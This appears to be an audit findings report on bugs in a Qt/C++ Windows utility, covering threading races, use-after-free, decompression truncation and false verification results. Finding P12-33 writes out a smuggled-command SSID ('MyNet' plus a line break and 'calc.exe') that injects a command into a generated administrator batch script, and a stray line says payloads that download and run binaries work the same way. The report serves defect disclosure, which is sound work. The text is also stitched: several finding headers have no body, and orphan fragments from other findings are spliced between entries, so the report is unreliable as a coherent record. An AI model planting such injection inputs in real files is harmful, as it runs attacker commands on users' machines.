- Evidence: quick_action_controller.cpp:425 (startScanWorker) and :453 (startExecutionWorker) add a persistent connect(action, &QuickAction::scanComplete/executionComplete, this, lambda) on every run, with no disconnect and no Qt::SingleShotConnection. action and this are both long-lived, so N runs of the same action leave N live connections. On the Nth run's completion the signal fires N onScanComplete/onExecutionComplete calls. The 1st call clears m_current_*_action (line 348/376), cleans the thread, then dequeues+starts the next action, re-setting m_current_*_action to that new action. The null guard at line 343/371 (if (!m_current_*_action) return;) therefore does NOT protect the 2nd (stale) invocation, which now sees the NEW action as current and tears it down: emits actionScanComplete/actionExecutionComplete prematurely and calls m_scan_thread->wait()/m_execution_thread->wait() (no timeout, line 356/392) on the just-started thread, blocking the GUI thread until it finishes and deleting it. No disconnect exists in the file.
- Fix: Use Qt::SingleShotConnection on the scanComplete/executionComplete completion connections (Qt 6 supports it), or store the QMetaObject::Connection and disconnect it in onScanComplete/onExecutionComplete after use.

### P06-13 [HIGH] src/core/quick_action_controller.cpp:112
**Timed-out worker is destroyed while running**

- Trigger: Run S.A.K.-Utility elevated (SFC/DISM require admin, so the in-process worker path at executeAction->startExecutionWorker is taken, not the elevated-helper path). Trigger the "Verify System Files" action. Its execute() calls runDismCheckHealth()/runDismScanHealth() (src/actions/verify_system_files_action.cpp:61,72), which invoke runPowerShell(script, timeout) WITHOUT a should_cancel callback (kTimeoutDismScanMs = 600000ms / 10 min, kTimeoutDismCheckMs = 120000ms). Close the app while DISM /ScanHealth is running. ~QuickActionController calls m_current_execution_action->cancel() (sets m_cancelled), but process_runner.cpp:83 only polls cancellation when should_cancel is non-empty, so the blocked worker never sees it and execute() keeps running for minutes. cleanupThread's thread->wait(kThreadShutdownWaitMs=10000) times out after 10s and merely logs; the destructor then continues.
- Evidence: quick_action_controller.cpp:106-121 (~QuickActionController): after cancel(), cleanupThread does thread->quit(); if(!thread->wait(10'000)) logs error, then unconditionally thread->deleteLater() and continues. The 10s wait is the only guard and is insufficient because the DISM/SFC paths do not wire cancellation to the running process. Two concrete faults result once wait() times out on a still-running worker: (1) the QThread was created as `new QThread(this)` (line 277/449) so it is a child of the controller; deleteLater posts a deferred-delete but the object still has parent `this`, so when ~QObject deletes children it destroys a still-running QThread -> Qt qFatal "QThread: Destroyed while thread is still running". (2) The QuickAction was moveToThread'd onto the worker (startExecutionWorker line 450) and is owned by the m_actions unique_ptr vector member; those members are destroyed while execute() is still running on the worker thread -> use-after-free of the action object. process_runner.cpp:83 confirms empty should_cancel => no cancellation; verify_system_files_action.cpp:61,72 confirm DISM calls omit the callback; layout_constants.h:80,83,85 confirm multi-minute timeouts (2/10/30 min) far exceeding the 10s shutdown wait.
- Fix: Either wire isCancelled() into the DISM/SFC runPowerShell calls (pass should_cancel) so cancellation actually terminates the child process within the 10s budget, and/or in the destructor do not deleteLater/destroy while a worker is genuinely still running: after wait() timeout, forcibly terminate/join (or leak the QThread by unparenting it and detaching, and keep the action alive) rather than deleting a running QThread and its in-use action.

### P04-07 [HIGH] src/core/streaming_decompressor.cpp:80
**EOF handling silently accepts truncation and drops members**

- Trigger: Open a truncated (e.g. partially-downloaded) ubuntu.img.gz via CompressedImageSource: decompressor->read() returns the partial bytes then 0 with atEnd()==true and lastError() empty, so the flashing path treats it as a complete image and writes a truncated image with no warning. Equivalently, `cat a.gz b.gz > combined.gz` decodes only a.gz's contents; b.gz's data is silently dropped. Same for concatenated .xz (flags 0, no LZMA_CONCATENATED) and multi-stream .bz2.
- Evidence: streaming_decompressor.cpp read() loop (lines 71-88) plus tryRefillInput (113-125) use a single m_eof that is set true on EITHER physical file EOF (line 121, when fillInputBuffer returns 0 and m_file.atEnd()) OR decoder stream_end (line 80-81). Neither prong is guarded: (1) Truncation-accept: on a truncated stream the decoder returns StepResult::ok (Z_OK/LZMA_OK/BZ_OK) up to the last available bytes, never stream_end; input then empties, refill hits atEnd, m_eof is set, read() breaks (line 75-77) and returns partial bytes; further reads return 0 (line 65) with atEnd() true and m_lastError empty. decompressStep is never re-driven to elicit the decoder's truncation error, so a corrupt/short stream is reported as clean EOF. uncompressedSize() is -1 for all three formats and image_source.cpp does no size check. (2) Concatenated-drop: decompressStep maps the first member's Z_STREAM_END/LZMA_STREAM_END/BZ_STREAM_END to StepResult::stream_end (gzip_decompressor.cpp:59, xz_decompressor.cpp:52, bzip2_decompressor.cpp:54); read() sets m_eof and stops (80-83) with no inflateReset / LZMA_CONCATENATED (xz_decompressor.cpp:17 passes flags 0) / bzip2 multi-stream restart, so subsequent members are silently discarded. This decompressor backs CompressedImageSource (image_source.cpp:255-343) used to decompress disk images for flashing, so a truncated or multi-member compressed image yields a short/partial image flashed with no error.
- Fix: Separate the two conditions: track input/file EOF distinctly from decoder completion; require a decoder-confirmed stream_end before reporting successful end-of-stream (raise an error if physical EOF is reached without stream_end = truncation), and to support concatenated members either reset the decoder (inflateReset) / init xz with LZMA_CONCATENATED / restart bzip2 on stream_end and continue while input remains.

### P07-44 [HIGH] src/core/stress_test_worker.cpp:153
**Failed stress components can produce a passing result**

### P07-52 [HIGH] src/core/windows_usb_creator_extract.cpp:495

Any payload (e.g. downloading/executing a binary) works the same way.

There is no guard anywhere between parse (line 123) and use (line 495).

(10675). The refresh completion handler reassigns m_inventory (partition_manager_controller.cpp:112) inside the modal loop, freeing that storage. No by-value snapshot and no busy-guard exists on this path. (Note: the Clone Disk wizard cited in the report is actually safe - DiskCopyWizardConfig stores const PartitionInventory* to the stable m_inventory member (10829) and re-resolves the disk by number via findWizardDisk on every repaint (7655), tolerating nullptr; only the Quick Partition path holds a dangling element pointer.)

### P12-27 [HIGH] src/gui/user_profile_restore_wizard_pages.cpp:1899
**App installation task can outlive its page**

- Trigger: User opens the User Profile Restore wizard, selects apps on the App Restore page, clicks Install; while Chocolatey is installing the first package (installPackage blocked, seconds-to-minutes window), the user clicks Cancel or closes the wizard window. finished -> deleteLater destroys the page on the GUI thread. When installPackage returns, the worker executes `QPointer self(this)` at line 1937 with a dangling `this`, reading freed QObjectPrivate memory -> UB/crash.
- Evidence: installAppsSequentially (src/gui/user_profile_restore_wizard_pages.cpp:1926-1971) runs on a QtConcurrent thread-pool thread using raw `this`. Its loop blocks on the long synchronous chocoManager->installPackage() (line 1953), then constructs `QPointer<...> self(this)` at line 1937 and invokeMethod(this,...) at line 1960 from that raw `this`. The page can be destroyed while installPackage() is blocked: isComplete() (line 1597 `return !m_installing;`) only disables Next/Finish, not Cancel or the window X. The wizard is shown non-modally (user_migration_panel.cpp:235) and its QDialog::finished handler unconditionally calls wizard->deleteLater() (user_migration_panel.cpp:229), destroying the page and its children. Nothing cancels/joins the future on destruction, and there is no reject()/closeEvent override. When installPackage() returns, line 1937 constructs a QPointer from the now-dangling `this`, which dereferences the freed QObjectPrivate (QWeakPointer::getAndRef) = undefined behavior. The `if (!self)` checks inside the queued lambdas do not help; the UB is the QPointer construction from freed memory. The one-time `if (!self)` guard at line 1900 only covers task start, not the mid-loop window.

### P12-33 [HIGH] src/gui/wifi_manager_panel.cpp:2062
**SSID permits batch-command injection**

- Trigger: Load a crafted JSON table: [{"ssid":"MyNet\r\ncalc.exe","password":"","security":"WPA2","hidden":false}]. Click Export Windows Script(s). The generated .cmd contains: `echo Network: MyNet` <CRLF> `calc.exe` <CRLF>. When the user runs the .cmd (as Administrator, as instructed), calc.exe (or any attacker-chosen command) executes. escapeBatchString leaves the CR/LF untouched, so the injected line runs as a standalone command.
- Evidence: escapeBatchString() at src/gui/wifi_manager_panel.cpp:2062-2073 escapes only & | > < ^ ! ( ). It does NOT escape CR/LF, double-quote, or %. loadTableFromJson() at line 2422 sets cfg.ssid = obj["ssid"].toString() with no control-char filtering; the value survives through the table into buildBatchScript(). At line 2082 (`script += "echo Network: " + safe_ssid + "\r\n";`) and line 2112 an embedded newline splits into a fresh batch command line. The .cmd is written to disk (exportMultipleWindowsScripts line 1258-1268 / onSaveWindowsScript line 1220) and is intended to be run with Administrator rights (netsh wlan add profile). No validation rejects control characters anywhere in the load/build path, so it is unguarded. The netsh connect line also uses only ^-escaping inside double quotes (line 2103), so an unescaped `"` in the SSID additionally breaks out of the quoted argument.
- Fix: Reject/strip control characters (CR, LF, and other non-printing) from SSID on JSON load and at script generation, and additionally escape `"` and `%` (or validate SSID against a strict allowlist) before embedding in batch command lines.

### P07-56 [HIGH] src/threading/flash_worker.cpp:434
**Sample verification passes when all sample reads fail**

- Trigger: Target removable device becomes unreadable during sample verification (I/O error or disconnect after writeCompleted). Every ReadFile(m_deviceHandle,...) at line 496 fails, so all numSamples iterations hit `continue` at 503; samplesVerified returns 0, corruptedBlocks stays 0, result.passed stays true from line 434. verifyImage() returns passed=true and line 122 treats the flash as verified though zero blocks were ever read back and compared. Identical outcome if a non-seekable recompressed source makes every m_imageSource->seek (473) fail.

In verifySampleBlocks (462-520) every I/O failure path only appends an error and `continue`s without altering passed: source seek fail (474), source read<=0 (480-481), target SetFilePointerEx fail (491), ReadFile fail (501-503). passed is set false ONLY on a memcmp mismatch (508). The only early-out guard is totalBlocks<1 (437-441); nothing checks that samplesVerified>0 or that errors is empty. Caller (122) keys solely on result.passed, so passed=true is reported as a successful verification even with samplesVerified==0 and N appended errors.
- Fix: In verifySample, after verifySampleBlocks return, require samplesVerified == numSamples (or at minimum samplesVerified>0 and result.errors empty) before leaving passed=true; treat any sample I/O error as a verification failure.

### P12-35 [HIGH] src/tools/sak_apfs_writer_cli.cpp:390

The malformed --patch-offset-bytes 'abc' fails parsing, the error is silently discarded, patch_offset_bytes defaults to 0, and the payload is written at offset 0 of the target file instead of the command being rejected, corrupting unintended bytes.
- Evidence: In src/tools/sak_apfs_writer_cli.cpp:390-394, mutationInputsFromParser calls patchOffsetForCommand with a LOCAL &patchOffsetError (not the main *error), then builds CliMutationInputs with patchOffset.value_or(0). On parse failure patchOffsetForCommand returns std::nullopt (via parseNonNegativeUInt64Option at line 1791/56-67, which sets *error and returns nullopt when toULongLong !ok), so value_or(0) yields offset 0. The failure string is threaded only into CliInvocation.patch_offset_error (assigned at line 460) and is NEVER read anywhere: a codebase-wide grep for patch_offset_error finds only the two struct declarations (250, 336) plus the single assignment (460), no consumer. mutationInputsFromParser still returns a valid optional, so invocationFromParser succeeds and the patch commands (buildCommitFilePatchReport line 1428, buildCommitRawFilePatchReport line 1442) pass invocation.patch_offset_bytes==0 straight into commitImageOnlyFilePatch / commitRawFilePatch. No downstream guard rejects the discarded error. Note lines 1787-1789 are dead for cowPatch (the cowPatch&&!isSet case already returned 0 at line 1781), so the only nullopt path is the invalid-value parse failure the report describes.
- Fix: In mutationInputsFromParser, after calling patchOffsetForCommand, if !patchOffset.has_value() propagate the failure: set *error = patchOffsetError and return std::nullopt (mirroring the other value-less short-circuits above it), rather than storing the error in a field that is never inspected.

### P12-37 [HIGH] src/tools/sak_apfs_writer_cli.cpp:723
**Import destroys existing output before replacement succeeds**

- Trigger: Run the import command with --output-image equal to the source image on a disk with insufficient free space, e.g. `sak_apfs_writer_cli import --target-path img.apfs --output-image img.apfs --file-name new.txt --payload ...`. collectImportSourceFiles reads img.apfs into memory and reEmitImportedFiles builds the new container in the scratch temp dir; line 723 removes img.apfs; line 724 QFile::copy fails with ENOSPC; the function returns, scratch QTemporaryDir is destroyed, and img.apfs (the only copy of the source) is permanently lost. Even with output!=source, a copy failure destroys any pre-existing output file while leaving no replacement.
- Evidence: src/tools/sak_apfs_writer_cli.cpp:723-727 (buildImportImageReport). Line 723 `QFile::remove(outputPath)` unconditionally deletes the destination, then line 724 `QFile::copy(*currentPath, outputPath)` copies the re-emitted container from the local `QTemporaryDir scratch` (declared line 709). `QFile::copy` will not overwrite an existing file, so the prior remove is deliberate but leaves the replace non-atomic. The re-emitted image exists ONLY in `scratch`, which is destroyed when the function returns on the copy-failure path. There is no QSaveFile, temp-sibling, atomic rename, or output!=source guard anywhere in this path. Because the source is fully read into memory in collectImportSourceFiles (line 702) before line 723, and the import op is explicitly an "arbitrary Apple-media APFS read-modify-write" (comment lines 692-697), passing --output-image equal to the source path is a realistic in-place-edit invocation. On a copy failure the removed file is not recoverable.
- Fix: Copy to a sibling temp file in the output directory, flush/close it, then atomically replace the destination (e.g. QSaveFile, or copy-to-temp then QFile::rename with remove-on-success), so the original is only removed after the new image is fully written.

## MEDIUM (155)

### P02-13 [MEDIUM] include/sak/partition_hfs_internal.h:10794
**Zero extent descriptors do not terminate the list**

- Trigger: Craft an HFS+/HFSX image whose attribute-extents record (parsed by parseExtents, include/sak/partition_hfs_internal.h:10788) or extents-overflow record (parseOverflowExtentRecord, line 11453) has descriptors [{start=100,count=2},{start=0,count=0},{start=500,count=3},0...]. Both loops drop the zero descriptor and compact the list to [{100,2},{500,3}] instead of terminating at the first zero. When a read requests logical block 2 (which per TN1150 is past end-of-record), physicalBlockInExtents (line 11357, using best->start_block accumulation over the compacted list) maps it onto physical block 500 and readAt fetches 3 blocks of unrelated on-disk data as this file/attribute's content - a content mismap / info leak from a malformed image.
- Evidence: parseExtents (10788-10799): `if (blockCount != 0) extents.append(...)` skips zero descriptors and keeps reading later ones. parseOverflowExtentRecord (11453-11461): `if (count == 0) continue;` does the same. Contrast parseFork (9948-9965) which correctly `break`s at the first zero with a comment warning that skip-and-continue "would compact a malformed record and mismap every later extent onto the wrong logical blocks" - proving the maintainer treats this exact behavior as a bug, but the two parsers named in the finding were not given the same fix. The compacted extents feed physicalBlockForAttributeForkOffset -> physicalBlockFromAttributeExtents -> physicalBlockInExtents (11326/11357), which drives actual content reads via readAt. No termination guard or count-vs-fork-blocks validation exists on these two paths.
- Fix: In parseExtents (line 10794) and parseOverflowExtentRecord (line 11457), replace the skip/continue on zero-count with `break` so the first zero descriptor terminates the list, matching parseFork. Optionally reject (blocker) any nonzero descriptor seen after a zero.

### P02-16 [MEDIUM] include/sak/partition_hfs_internal.h:11596
**HFS entry cap can produce a silently incomplete export**

- Trigger: Call PartitionHfsFileSystemReader::exportDirectoryFromImage on an HFS+ image whose root (or any single flat directory) contains 1001 files, with default options (max_entries=1000). listDirectory returns exactly 1000 entries (childRecords truncates silently), all 1000 are exported, entries_scanned reaches 1000 with no further entry to trip consumeEntrySlot, pending_ empties, and the result comes back ok=true with files_exported=1000 - the 1001st file is silently omitted with no blocker or warning.
- Evidence: childRecords() (include/sak/partition_hfs_internal.h:11580-11608) caps its result vector at maxEntries (line 11596: break on records.size() >= maxEntries) and returns success (m_blockers empty) with NO blocker or warning on truncation. The export driver HfsDirectoryExporter::processFrame (src/core/partition_hfs_file_system_reader.cpp:145-146) requests each listing capped at std::max(1, options_.max_entries - result_.entries_scanned), so listDirectory can never return more than the remaining budget. consumeEntrySlot() (lines 187-194) only appends the "Export entry cap reached" blocker when processEntry is invoked on an entry beyond the budget - but that entry is never produced because the listing was pre-truncated. For a single flat directory with more than max_entries children, all budget entries are consumed exactly, no next entry exists, pending_ empties, and run() sets result_.ok = blockers.isEmpty() = true. The excess children are silently dropped with success reported. Default export cap is kPartitionHfsDefaultBrowseEntryLimit = 1000 (partition_hfs_file_system_reader.h:88,20).
- Fix: In childRecords, request maxEntries+1 internally (or have appendChildRecords detect one record beyond the cap for the target folderId) and, when a record past the cap exists, append a truncation blocker/warning so the exporter surfaces the incomplete export instead of reporting success.

### P07-02 [MEDIUM] src/actions/check_disk_errors_action.cpp:110
**PowerShell script contains literal backslash-n tokens**

- Trigger: Run the Check Disk Errors action against any writable drive (e.g. C:). buildRepairVolumeScript('C') returns a string whose separators are literal backslash-n text; powershell.exe -Command rejects it with an 'unexpected token' parse error, so no drive is actually scanned and each scan reports an error instead of results.
- Evidence: src/actions/check_disk_errors_action.cpp:108-138 buildRepairVolumeScript uses C++ literal "\\n" which is the two-character sequence backslash+n, not a newline. The assembled script is passed verbatim to powershell.exe -Command via runPowerShell (src/core/process_runner.cpp:168, called at check_disk_errors_action.cpp:238-240) with no \n->newline substitution anywhere in the path. PowerShell therefore receives one logical line with literal \n tokens between statements (e.g. $drive = "C:"\nWrite-Output ...), which is an unparseable multi-statement line (statements need newline or semicolon separators). Every drive scan fails to parse. Fix: replace \\n with \n throughout the function.
- Fix: Change every "\\n" in buildRepairVolumeScript to "\n" (single backslash = real newline).

### P07-04 [MEDIUM] src/actions/reset_network_action.cpp:141
**Winsock backup is deleted before the reset finishes**

- Trigger: Run the Network Reset action. During executeFlushDns, netsh writes the catalog to %TEMP%/sak_winsock_ABC123.txt; on function return the QTemporaryFile destructor auto-removes it (occurs before the winsock reset even executes). The final report then states "Winsock backup saved to: %TEMP%\winsock_backup.txt" - a path that has no file, so the user has no recoverable backup and is told a false location.
- Evidence: reset_network_action.cpp:141-147 creates a local QTemporaryFile with setAutoRemove(true) named sak_winsock_XXXXXX.txt; line 148 dumps `netsh winsock show catalog` into that path. executeFlushDns is invoked at line 121, well before the Winsock reset (line 125). When executeFlushDns returns, the local backupFile goes out of scope and its destructor (autoRemove=true) deletes the catalog file. Later, executeBuildReport (line 348) hardcodes an entirely different path `QDir::temp().filePath("winsock_backup.txt")` and reports "Winsock backup saved to: %1" (line 349-350) - a file that was never written. Net result: no backup survives, and the reported path is fictitious. Nothing in the tree guards this.
- Fix: Either drop auto-remove and move/rename the temp file to the reported winsock_backup.txt before executeFlushDns returns (retain the path in a member for the whole operation and report that exact path), or stop claiming a backup was saved.

### P07-05 [MEDIUM] src/actions/verify_system_files_action.cpp:33
**SFC and DISM failures can be reported as a healthy system**

- Trigger: Launch the action without admin elevation: sfc prints "You must be an administrator..." (no "found corrupt files") and DISM /Online fails with elevation error 740 (no "corruption"/"repairable" in stdout). Both DISM keyword checks return false -> else branch sets m_dism_successful=true, SFC leaves m_sfc_found_issues=false -> verificationSucceeded() returns true and the result is reported as a healthy, successfully verified system even though neither tool actually ran.
- Evidence: verify_system_files_action.cpp: runDismCheckHealth (l.56-66) and runDismScanHealth (l.68-78) return true only when stdout contains "corruption"/"repairable"; on a failed/empty DISM launch both return false, so runDISM's else branch (l.116-120) sets m_dism_successful=true, m_dism_repaired_issues=false. runSFC (l.19-54) only sets m_sfc_found_issues when stdout contains "found corrupt files"; a failed SFC leaves it false. verificationSucceeded (l.170-172) = m_dism_successful && (!m_sfc_found_issues || m_sfc_repaired) then returns true. proc.std_err is only logged (l.35-37, 62-64, 73-75, 88-90); exit_code/succeeded() (process_runner.h:16-24) are never consulted, and proc.exit_status/timed_out are ignored except proc.cancelled.

### P08-08 [MEDIUM] src/ai/ai_execution_broker.cpp:37
**Output truncation keeps the wrong end**

- Trigger: With default max_output_bytes = 262144 (half_cap = 131072), a command emits ~180 KB of stdout whose final lines contain the actual failure/error message. appendCapped keeps all 180 KB (< 262144). At completion cappedTail returns bytes.left(131072) + a truncation note, discarding the final ~49 KB including the terminal error line. The AI/result consumer sees only the beginning of the output and never the newest diagnostics or final error.
- Evidence: src/ai/ai_execution_broker.cpp:37 - cappedTail() returns bytes.left(max_bytes), keeping the HEAD (oldest output) despite its name promising the tail. This contradicts the module's own intent: appendCapped() at lines 450-456 keeps bytes.right(m_max_output_bytes) (newest tail) when the running buffer overflows. So the buffer preserves the newest output, then the final truncation at half_cap (lines 356-357 onProcessFinished, 399-400 onTimeoutTick) slices off the oldest half and discards the newest half - exactly where a command's terminal error/exit status lives. Not guarded or fixed anywhere.
- Fix: Return bytes.right(max_bytes) (prepend the truncation note) while trimming to a valid UTF-8 boundary, matching the cappedTail name and appendCapped's tail-preserving behavior.

### P08-09 [MEDIUM] src/ai/ai_mcp_http_client.cpp:94
**SSE notifications are mistaken for RPC responses**

- Trigger: A spec-compliant MCP Streamable-HTTP server streams a progress/logging notification before the response, e.g. body: `data: {"jsonrpc":"2.0","method":"notifications/progress","params":{"progress":1}}\n\ndata: {"jsonrpc":"2.0","id":1,"result":{"content":[...]}}`. extractJsonRpcMessage returns the first data event (the notification object) instead of the id:1 result; callTool returns that notification to the caller as the tool result, silently dropping the actual result.
- Evidence: src/ai/ai_mcp_http_client.cpp:78-95 - extractJsonRpcMessage() iterates SSE lines and returns the FIRST parseable non-empty JSON object (line 90-95: `if (!object.isEmpty()) { return object; }`) with no check of the JSON-RPC `id` (request uses id:1, line 45) and no distinction between a notification (has `method`, no `id`) and a response (has `id`/`result`). The worker reads the entire finished response body (line 152), so all interleaved SSE `data:` events are present, and the first one wins. explainJsonRpcError() (line 226) only checks for an `"error"` key, so a notification object passes through as the tool result and the real response is discarded.
- Fix: In the SSE loop, skip parsed objects that are notifications or whose `id` does not match the request id (1); continue scanning until a JSON-RPC response with the expected id (containing `result` or `error`) is found.

### P08-11 [MEDIUM] src/ai/ai_provider_gateway_tool_runner.cpp:41

No transport "error" member is present, so callTool returns the message; win32McpResult packages result_text="element not found"; finalizeResult sets success=true. ### P08-22 [MEDIUM] src/ai/openai_responses_client.cpp:697

### P04-02 [MEDIUM] src/core/advanced_search_controller.cpp:73
**Old worker signals corrupt a replacement search**

- Trigger: User starts search B while search A is still running. startSearch (advanced_search_controller.cpp:67) sees State::Searching, calls cancelSearch()+cleanupWorker(). A's run() emits cancelled() (worker_base.cpp:53-54) as a cross-thread QueuedConnection metacall posted to the controller BEFORE wait() returns; any resultsReady A already posted also remain queued. m_worker.reset() destroys A but does not remove those events (Qt removes posted events only where the destroyed object is the receiver, i.e. the worker, not the controller). After startSearch(B) sets State::Searching (line 111) and returns to the event loop, A's queued onWorkerCancelled fires -> setState(Idle) (line 165) mid-search-B, and A's queued onResultsReady adds A's matches into B's m_total_matches (line 176) and re-emits them via resultsReceived.
- Evidence: advanced_search_controller.cpp:91-106 connect worker signals with auto (cross-thread => queued) connections. cleanupWorker() (lines 125-135) does requestStop()/wait()/reset() but never disconnect()s and has no generation guard; header (advanced_search_controller.h:134) has only m_worker, no token. Handlers mutate state unconditionally: onWorkerCancelled setState(Idle) (line 165), onResultsReady m_total_matches += (line 176). Worker emits cancelled/finished/resultsReady from run() on the worker thread (worker_base.cpp:42-59), so those metacalls are already queued to the main thread and survive the worker's destruction, being delivered after the new search has started.
- Fix: Add a per-search generation counter; capture it when creating the worker and ignore any worker signal whose generation != current (or disconnect and drop). Alternatively verify sender() == m_worker.get() at the top of each handler before mutating m_total_matches / m_state.

### P04-16 [MEDIUM] src/core/advanced_search_worker.cpp:1522
**ID3 UTF-16BE is decoded in host byte order**

- Trigger: An MP3 with an ID3v2 TIT2 frame whose text-encoding byte is 0x02 (UTF-16BE), e.g. title "AB" stored as bytes 00 41 00 42. On Windows, QString::fromUtf16 reads the code units as 0x4100 0x4200, yielding U+4100 U+4200 instead of "AB", so the indexed Title metadata is corrupt and a search for "AB" misses the file.
- Evidence: src/core/advanced_search_worker.cpp:1520-1524 decodeId3FrameValue: kId3EncodingUtf16Be (constant value 2, confirmed at line 1326) falls through the same case as kId3EncodingUtf16 (1) and is decoded with QString::fromUtf16, which reads code units in host byte order (little-endian on Windows x86) with no byte-swap. ID3v2 text encoding byte 0x02 is defined as UTF-16BE (no BOM). Therefore genuinely-big-endian frame text is byte-swapped on Windows. Encoding 1 relies on a BOM to indicate endianness, which fromUtf16 also does not honor, but the finding specifically concerns encoding 2, and for encoding 2 there is no BOM to save it. No byte-order handling precedes this code. Not guarded anywhere.
- Fix: For encoding 2, decode as big-endian (e.g. QStringDecoder(QStringConverter::Utf16BE) or manual byte-swap). For encoding 1, honor the leading BOM to pick LE/BE instead of assuming host order.

### P04-17 [MEDIUM] src/core/advanced_search_worker.cpp:382

### P06-03 [MEDIUM] src/core/advanced_uninstall_controller.cpp:419
**Enumerator is moved from the wrong thread**

- Trigger: Open Advanced Uninstall, click Refresh (enumeration runs on m_enumThread and completes fine the first time). Click Refresh a second time. Because onEnumerationFinished ran on the main thread, its line-419 m_enumerator->moveToThread(thread()) failed (wrong-thread move), leaving the enumerator bound to the now-destroyed first QThread. The second refreshPrograms()'s moveToThread(new QThread) at line 99 also fails, and the QThread::started->enumerateAll signal is queued to the dead thread's event loop, so enumerateAll never executes: the controller is stuck in State::Enumerating, statusMessage stays "Enumerating installed programs...", and every later Refresh is blocked by the state != Idle guard until app restart.
- Evidence: src/core/advanced_uninstall_controller.cpp:419 (and identical at :439). onEnumerationFinished/onEnumerationFailed are queued slots (Auto connection at lines 59-66; enumerationFinished is emitted from enumerateAll on m_enumThread while receiver `this` lives on the main thread), so they run on the MAIN thread. `m_enumerator->moveToThread(thread())` uses `this->thread()` = main thread as target, but the enumerator's current affinity is still m_enumThread. Qt only permits moveToThread from the object's owning thread, so this call fails with "Cannot move to target thread" and is a no-op. The enumerator is left on m_enumThread, which is then quit()/deleteLater'd (lines 421-422), giving the enumerator dangling affinity to a finished thread. On the next refreshPrograms() the line-99 moveToThread(newThread) - again issued from the main thread while the object belongs to the dead thread - fails too, and the QThread::started->enumerateAll queued connection (line 101) posts to the dead thread's event loop, so enumeration never starts and the UI stalls in State::Enumerating. setState(State::Idle) at line 426 executes after the failed move, so the state guard at line 83 does not prevent the second, stalling attempt. No busy-check, validation, or affinity guard mitigates this.
- Fix: Move the enumerator back to the main thread from a slot that actually runs on m_enumThread (e.g. connect QThread::finished on the worker side), or simpler: destroy and recreate a fresh ProgramEnumerator per enumeration run so no cross-thread moveToThread is needed on the GUI-thread completion path.

### P02-05 [MEDIUM] src/core/apfs_keybag.cpp:84
**DER length parsing invokes signed overflow and out-of-bounds access**
